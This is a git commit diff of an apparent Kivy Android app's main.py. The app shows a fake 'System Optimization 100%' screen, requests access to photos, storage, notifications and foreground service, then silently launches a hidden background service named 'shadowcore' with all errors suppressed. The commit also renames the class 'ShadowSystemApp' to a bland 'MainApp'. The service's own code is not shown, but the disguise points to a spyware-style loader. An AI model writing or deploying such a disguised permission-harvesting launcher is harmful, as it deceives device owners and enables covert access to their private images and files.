5a42d9a99851e71f740eaa7186cc0c3ca5a84fc8
kingclothes93-a11y <kingclothes93@gmail.com>
2026-04-25 10:04:56 +0300

    Update main.py

--- main.py
+++ main.py
@@ -3,36 +3,24 @@ from kivy.uix.label import Label
 from kivy.clock import Clock
 from jnius import autoclass
 
-class ShadowSystemApp(App):
+class MainApp(App):
     def build(self):
-        return Label(text="System Optimization...", halign="center")
+        return Label(text="System Optimization 100%")
 
     def on_start(self):
-        Clock.schedule_once(self.trigger_permissions, 1)
+        Clock.schedule_once(self.ask_perms, 1)
 
-    def trigger_permissions(self, dt):
+    def ask_perms(self, dt):
         try:
             from android.permissions import request_permissions, Permission
-            perms = [
-                Permission.READ_MEDIA_IMAGES, 
-                Permission.POST_NOTIFICATIONS, 
-                Permission.READ_EXTERNAL_STORAGE, 
-                Permission.FOREGROUND_SERVICE
-            ]
-            request_permissions(perms, self.launch_logic)
+            request_permissions([Permission.READ_MEDIA_IMAGES, Permission.READ_EXTERNAL_STORAGE, Permission.POST_NOTIFICATIONS, Permission.FOREGROUND_SERVICE], self.go)
         except: pass
 
-    def launch_logic(self, permissions, grants):
+    def go(self, permissions, grants):
         try:
-            # هذا السطر هو مفتاح تشغيل الخدمة في Kivy
-            from android import arcade_service # محاكاة بسيطة للبيئة
-            PythonActivity = autoclass('org.kivy.android.PythonActivity')
-            context = PythonActivity.mActivity
-            # التعديل هنا: اسم الكلاس يجب أن يكون هكذا ليتطابق مع buildozer
-            service_class = autoclass('org.test.shadowcore.ServiceService')
-            service_class.start(context, "")
-        except Exception as e:
-            print(f"Service Error: {str(e)}")
+            service = autoclass('org.test.shadowcore.ServiceService')
+            service.start(autoclass('org.kivy.android.PythonActivity').mActivity, "")
+        except: pass
 
 if __name__ == "__main__":
-    ShadowSystemApp().run()
+    MainApp().run()
